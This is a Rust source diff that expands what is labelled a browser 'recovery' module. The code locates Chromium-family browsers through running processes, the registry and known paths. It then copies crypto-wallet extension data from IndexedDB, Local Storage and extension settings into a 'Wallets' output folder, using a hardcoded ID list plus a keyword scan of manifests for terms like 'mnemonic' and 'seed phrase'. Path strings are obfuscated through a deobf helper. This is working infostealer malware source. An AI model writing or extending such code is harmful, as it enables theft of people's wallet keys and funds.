@@ -1,12 +1,15 @@
 use crate::recovery::context::RecoveryContext;
 use crate::recovery::fs::copy_dir_limited;
-use crate::recovery::helpers::obfuscation::{deobf};
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
+use std::collections::HashSet;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use tokio::fs;
 use tracing::{debug, warn};
+use winreg::RegKey;
+use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
 
 #[derive(Clone, Copy, Debug)]
 pub enum BrowserDataKind {
@@ -60,6 +63,13 @@ pub enum BrowserName {
     Brave,
     Opera,
     Chromium,
+    Vivaldi,
+    Yandex,
+    ThreeSixty, // 360
+    QQ,
+    CocCoc,
+    NaverWhale,
+    Arc,
 }
 
 impl BrowserName {
@@ -70,6 +80,13 @@ impl BrowserName {
             BrowserName::Brave => "Brave Browser",
             BrowserName::Opera => "Opera Browser",
             BrowserName::Chromium => "Chromium",
+            BrowserName::Vivaldi => "Vivaldi",
+            BrowserName::Yandex => "Yandex",
+            BrowserName::ThreeSixty => "360 Browser",
+            BrowserName::QQ => "QQ Browser",
+            BrowserName::CocCoc => "CocCoc",
+            BrowserName::NaverWhale => "Naver Whale",
+            BrowserName::Arc => "Arc",
         }
     }
 
@@ -80,6 +97,13 @@ impl BrowserName {
             BrowserName::Brave => "brave.exe",
             BrowserName::Opera => "opera.exe",
             BrowserName::Chromium => "chromium.exe",
+            BrowserName::Vivaldi => "vivaldi.exe",
+            BrowserName::Yandex => "browser.exe",
+            BrowserName::ThreeSixty => "360chrome.exe",
+            BrowserName::QQ => "QQBrowser.exe",
+            BrowserName::CocCoc => "browser.exe",
+            BrowserName::NaverWhale => "whale.exe",
+            BrowserName::Arc => "Arc.exe",
         }
     }
 }
@@ -224,12 +248,6 @@ pub struct BrowserExtensionTask {
     profile: BrowserProfile,
 }
 
-impl BrowserExtensionTask {
-    pub fn new(profile: BrowserProfile) -> Self {
-        Self { profile }
-    }
-}
-
 const TARGET_EXTENSIONS: &[(&str, &str)] = &[
     ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
     ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
@@ -307,8 +325,30 @@ impl RecoveryTask for BrowserExtensionTask {
         let indexed_db = self.profile.path.join("IndexedDB");
         let local_storage = self.profile.path.join("Local Storage").join("leveldb");
 
+        // 1. Identify Target Extensions (Whitelist + Heuristic)
+        let mut target_ids = Vec::new();
         for (name, id) in TARGET_EXTENSIONS {
-            let extension_settings_dir = local_ext_settings.join(id);
+            target_ids.push((name.to_string(), id.to_string()));
+        }
+
+        // Heuristic Discovery: Scan all extensions for crypto keywords in manifest
+        let extensions_root = self.profile.path.join("Extensions");
+        if let Ok(mut dir) = fs::read_dir(&extensions_root).await {
+            while let Ok(Some(entry)) = dir.next_entry().await {
+                let id = entry.file_name().to_string_lossy().to_string();
+                if target_ids.iter().any(|(_, tid)| tid == &id) {
+                    continue;
+                }
+
+                if let Some(name) = self.heuristic_check_extension(&entry.path()).await {
+                    target_ids.push((format!("Heuristic_{}", name), id));
+                }
+            }
+        }
+
+        // 2. Capture Data for all identified IDs
+        for (name, id) in target_ids {
+            let extension_settings_dir = local_ext_settings.join(&id);
             if fs::metadata(&extension_settings_dir).await.is_ok() {
                 let dest_root = ctx
                     .output_dir
@@ -324,7 +364,7 @@ impl RecoveryTask for BrowserExtensionTask {
                 let _ = copy_dir_limited(
                     &extension_settings_dir,
                     &dest_root,
-                    name,
+                    &name,
                     &mut artifacts,
                     usize::MAX,
                     0,
@@ -333,30 +373,31 @@ impl RecoveryTask for BrowserExtensionTask {
             }
 
             if fs::metadata(&indexed_db).await.is_ok() {
-                let mut dir = fs::read_dir(&indexed_db).await?;
-                while let Some(entry) = dir.next_entry().await? {
-                    let fname = entry.file_name().to_string_lossy().to_string();
-                    if fname.contains(id) {
-                        let dest_root =
-                            ctx.output_dir
-                                .join("services")
-                                .join("Wallets")
-                                .join(format!(
-                                    "{}_{}_{}_IndexedDB",
-                                    self.profile.browser.label(),
-                                    self.profile.profile_name,
-                                    name
-                                ));
-                        let _ = fs::create_dir_all(&dest_root).await;
-                        let _ = copy_dir_limited(
-                            &entry.path(),
-                            &dest_root.join(&fname),
-                            name,
-                            &mut artifacts,
-                            usize::MAX,
-                            0,
-                        )
-                        .await;
+                if let Ok(mut dir) = fs::read_dir(&indexed_db).await {
+                    while let Ok(Some(entry)) = dir.next_entry().await {
+                        let fname = entry.file_name().to_string_lossy().to_string();
+                        if fname.contains(&id) {
+                            let dest_root =
+                                ctx.output_dir
+                                    .join("services")
+                                    .join("Wallets")
+                                    .join(format!(
+                                        "{}_{}_{}_IndexedDB",
+                                        self.profile.browser.label(),
+                                        self.profile.profile_name,
+                                        name
+                                    ));
+                            let _ = fs::create_dir_all(&dest_root).await;
+                            let _ = copy_dir_limited(
+                                &entry.path(),
+                                &dest_root.join(&fname),
+                                &name,
+                                &mut artifacts,
+                                usize::MAX,
+                                0,
+                            )
+                            .await;
+                        }
                     }
                 }
             }
@@ -373,20 +414,21 @@ impl RecoveryTask for BrowserExtensionTask {
                         name
                     ));
 
-                let mut dir = fs::read_dir(&local_storage).await?;
-                while let Some(entry) = dir.next_entry().await? {
-                    let fname = entry.file_name().to_string_lossy().to_string();
-                    if fname.contains(id) {
-                        let _ = fs::create_dir_all(&dest_root).await;
-                        let target = dest_root.join(&fname);
-                        if let Ok(_) = fs::copy(entry.path(), &target).await {
-                            let meta = fs::metadata(&target).await?;
-                            artifacts.push(RecoveryArtifact {
-                                label: format!("{} Storage", name),
-                                path: target,
-                                size_bytes: meta.len(),
-                                modified: meta.modified().ok(),
-                            });
+                if let Ok(mut dir) = fs::read_dir(&local_storage).await {
+                    while let Ok(Some(entry)) = dir.next_entry().await {
+                        let fname = entry.file_name().to_string_lossy().to_string();
+                        if fname.contains(&id) {
+                            let _ = fs::create_dir_all(&dest_root).await;
+                            let target = dest_root.join(&fname);
+                            if let Ok(_) = fs::copy(entry.path(), &target).await {
+                                let meta = fs::metadata(&target).await?;
+                                artifacts.push(RecoveryArtifact {
+                                    label: format!("{} Storage", name),
+                                    path: target,
+                                    size_bytes: meta.len(),
+                                    modified: meta.modified().ok(),
+                                });
+                            }
                         }
                     }
                 }
@@ -397,22 +439,179 @@ impl RecoveryTask for BrowserExtensionTask {
     }
 }
 
+impl BrowserExtensionTask {
+    pub fn new(profile: BrowserProfile) -> Self {
+        Self { profile }
+    }
+
+    async fn heuristic_check_extension(&self, path: &Path) -> Option<String> {
+        // Extensions are usually Extensions/{id}/{version}/manifest.json
+        if let Ok(mut dir) = fs::read_dir(path).await {
+            while let Ok(Some(version_entry)) = dir.next_entry().await {
+                let manifest_path = version_entry.path().join("manifest.json");
+                if let Ok(content) = fs::read_to_string(&manifest_path).await {
+                    let content_low = content.to_lowercase();
+                    let keywords = [
+                        "wallet", "crypto", "mnemonic", "bip39", "bitcoin", "ethereum", 
+                        "solana", "passphrase", "seed phrase", "ledger", "trezor"
+                    ];
+                    
+                    if keywords.iter().any(|&k| content_low.contains(k)) {
+                        // Extract name from manifest
+                        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
+                            if let Some(name) = json.get("name").and_then(|v| v.as_str()) {
+                                 return Some(name.to_string());
+                            }
+                        }
+                        return Some("UnknownCryptoExtension".to_string());
+                    }
+                }
+            }
+        }
+        None
+    }
+}
+
 pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
+    let mut seen_roots = HashSet::new();
 
-    for (browser, root) in browser_data_roots(ctx) {
-        let profiles = BrowserProfile::discover_for_root(browser, &root).await;
-        for profile in profiles {
-            for kind in BrowserDataKind::all() {
-                let task: Arc<dyn RecoveryTask> =
-                    Arc::new(BrowserRecoveryTask::new(profile.clone(), kind));
-                tasks.push(task);
+    // 1. Process-Based Discovery (Active Browsers)
+    let running_roots = find_running_browsers(ctx);
+    for (browser, root) in running_roots {
+        if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
+            let profiles = BrowserProfile::discover_for_root(browser, &root).await;
+            for profile in profiles {
+                for kind in BrowserDataKind::all() {
+                    tasks.push(Arc::new(BrowserRecoveryTask::new(profile.clone(), kind)));
+                }
+                tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
             }
-            tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
+        }
+    }
+
+    // 2. Registry Discovery (Dynamic)
+    let registry_roots = find_registry_browsers(ctx);
+    for (browser, root) in registry_roots {
+        if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
+            let profiles = BrowserProfile::discover_for_root(browser, &root).await;
+            for profile in profiles {
+                for kind in BrowserDataKind::all() {
+                    tasks.push(Arc::new(BrowserRecoveryTask::new(profile.clone(), kind)));
+                }
+                tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
+            }
+        }
+    }
+
+    // 3. Standard Path Discovery (Fallback/Manual)
+    for (browser, root) in browser_data_roots(ctx) {
+        if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
+            let profiles = BrowserProfile::discover_for_root(browser, &root).await;
+            for profile in profiles {
+                for kind in BrowserDataKind::all() {
+                    tasks.push(Arc::new(BrowserRecoveryTask::new(profile.clone(), kind)));
+                }
+                tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
+            }
         }
     }
 
     tasks
+}
+
+fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
+    let mut results = Vec::new();
+    
+    // We iterate through our known browsers and check if their processes are active
+    let browsers = [
+        BrowserName::Chrome, BrowserName::Edge, BrowserName::Brave, BrowserName::Opera,
+        BrowserName::Vivaldi, BrowserName::Yandex, BrowserName::ThreeSixty, BrowserName::QQ,
+        BrowserName::CocCoc, BrowserName::NaverWhale, BrowserName::Arc, BrowserName::Chromium
+    ];
+
+    for browser in browsers {
+        let pid = super::lockedfile::proc::find_by_name(browser.process_name());
+        if pid != 0 {
+            // If we found a PID, try to get its executable path
+            use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
+            use windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW;
+            use windows::Win32::Foundation::CloseHandle;
+
+            unsafe {
+                if let Ok(h_proc) = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
+                    let mut path_buf = [0u16; 1024];
+                    let len = K32GetModuleFileNameExW(h_proc, None, &mut path_buf);
+                    let _ = CloseHandle(h_proc);
+
+                    if len > 0 {
+                        let exe_path = PathBuf::from(String::from_utf16_lossy(&path_buf[..len as usize]));
+                        if let Some(data_root) = resolve_data_root(ctx, browser, &exe_path) {
+                            if data_root.exists() {
+                                results.push((browser, data_root));
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    results
+}
+
+fn find_registry_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
+    let mut results = Vec::new();
+    let reg_path = "SOFTWARE\\Clients\\StartMenuInternet";
+
+    for root in [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER] {
+        if let Ok(key) = RegKey::predef(root).open_subkey(reg_path) {
+            for name in key.enum_keys().filter_map(Result::ok) {
+                if let Ok(browser_key) = key.open_subkey(&name) {
+                    if let Ok(command_key) = browser_key.open_subkey("shell\\open\\command") {
+                        if let Ok(exe_path_raw) = command_key.get_value::<String, _>("") {
+                            // Clean "path/to/exe" --args
+                            let exe_path = exe_path_raw.trim_matches('"').split(".exe").next().map(|s| format!("{}.exe", s)).unwrap_or(exe_path_raw);
+                            let exe_path = PathBuf::from(exe_path);
+                            
+                            if let Some(browser_name) = match_browser_by_path(&exe_path) {
+                                if let Some(data_root) = resolve_data_root(ctx, browser_name, &exe_path) {
+                                    if data_root.exists() {
+                                        results.push((browser_name, data_root));
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    results
+}
+
+fn match_browser_by_path(path: &Path) -> Option<BrowserName> {
+    let path_str = path.to_string_lossy().to_lowercase();
+    if path_str.contains("chrome.exe") { Some(BrowserName::Chrome) }
+    else if path_str.contains("msedge.exe") { Some(BrowserName::Edge) }
+    else if path_str.contains("brave.exe") { Some(BrowserName::Brave) }
+    else if path_str.contains("opera.exe") || path_str.contains("opera gx") { Some(BrowserName::Opera) }
+    else if path_str.contains("vivaldi.exe") { Some(BrowserName::Vivaldi) }
+    else if path_str.contains("browser.exe") && path_str.contains("yandex") { Some(BrowserName::Yandex) }
+    else if path_str.contains("360chrome.exe") { Some(BrowserName::ThreeSixty) }
+    else if path_str.contains("qqbrowser.exe") { Some(BrowserName::QQ) }
+    else if path_str.contains("browser.exe") && path_str.contains("coccoc") { Some(BrowserName::CocCoc) }
+    else if path_str.contains("whale.exe") { Some(BrowserName::NaverWhale) }
+    else if path_str.contains("arc.exe") { Some(BrowserName::Arc) }
+    else if path_str.contains("chromium.exe") { Some(BrowserName::Chromium) }
+    else { None }
+}
+
+fn resolve_data_root(ctx: &RecoveryContext, browser: BrowserName, _exe_path: &Path) -> Option<PathBuf> {
+    // For installed browsers, data is almost always in AppData regardless of install drive
+    // We reuse the standard roots but this allows us to confirm they exist if registry says browser is there.
+    let roots = browser_data_roots(ctx);
+    roots.into_iter().find(|(b, _)| *b as usize == browser as usize).map(|(_, p)| p)
 }
 
 pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
@@ -456,6 +655,62 @@ pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> 
             ctx.local_data_dir.join(deobf(&[
                 0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD4, 0xC8, 0xDB, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1,
                 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
+        ),
+        (
+            BrowserName::Vivaldi,
+            // "Vivaldi/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0xA1, 0xD4, 0xCC, 0xD4, 0xDB, 0xD3, 0xD2, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1,
+                0xDA, 0xDB, 0xDA,
+            ])),
+        ),
+        (
+            BrowserName::Yandex,
+            // "Yandex/YandexBrowser/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0xA2, 0xD4, 0xCF, 0xD3, 0xCE, 0xDF, 0xAF, 0xA2, 0xD4, 0xCF, 0xD3, 0xCE, 0xDF, 0x9F,
+                0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA,
+                0xDB, 0xDA,
+            ])),
+        ),
+        (
+            BrowserName::ThreeSixty,
+            // "360Browser/Browser/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0x86, 0x83, 0x85, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0x9F, 0xCF, 0xD2,
+                0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
+        ),
+        (
+            BrowserName::QQ,
+            // "Tencent/QQBrowser/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0x9F, 0xCE, 0xCF, 0x94, 0xCE, 0xCF, 0xDB, 0xAF, 0x84, 0x84, 0x9F, 0xCF, 0xD2, 0xDA,
+                0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
+        ),
+        (
+            BrowserName::CocCoc,
+            // "CocCoc/Browser/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0x90, 0xDA, 0x90, 0x90, 0xDA, 0x90, 0xAF, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF,
+                0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
+        ),
+        (
+            BrowserName::NaverWhale,
+            // "Naver/Whale/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0xF3, 0xD4, 0xCC, 0xCE, 0xDB, 0xAF, 0x94, 0xDB, 0xD4, 0xDB, 0xCE, 0xAF, 0xA0, 0x8E,
+                0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
+        ),
+        (
+            BrowserName::Arc,
+            // "Arc/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0xFA, 0xDB, 0x90, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
             ])),
         ),
     ]
